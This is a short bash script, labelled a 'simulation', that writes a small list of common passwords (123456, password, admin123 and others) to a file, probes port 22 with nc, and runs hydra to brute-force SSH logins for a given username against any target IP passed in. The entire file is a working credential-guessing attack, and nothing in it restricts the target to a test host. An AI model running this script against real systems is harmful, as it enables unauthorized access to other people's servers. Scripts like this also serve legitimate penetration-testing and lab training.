#!/usr/bin/env bash
set -euo pipefail

if [[ $# -lt 2 ]]; then
  echo "Usage: ./simulate_hydra.sh <target-ip> <username>"
  exit 1
fi

TARGET_IP="$1"
USERNAME="$2"
WORDLIST="pass.txt"

cat > "$WORDLIST" <<'EOF'
123456
password
admin123
ubuntu
kali
EOF

echo "Testing SSH reachability on $TARGET_IP:22"
nc -vz "$TARGET_IP" 22

echo "Running Hydra SSH brute-force simulation"
hydra -l "$USERNAME" -P "$WORDLIST" ssh://"$TARGET_IP" -t 4 -V
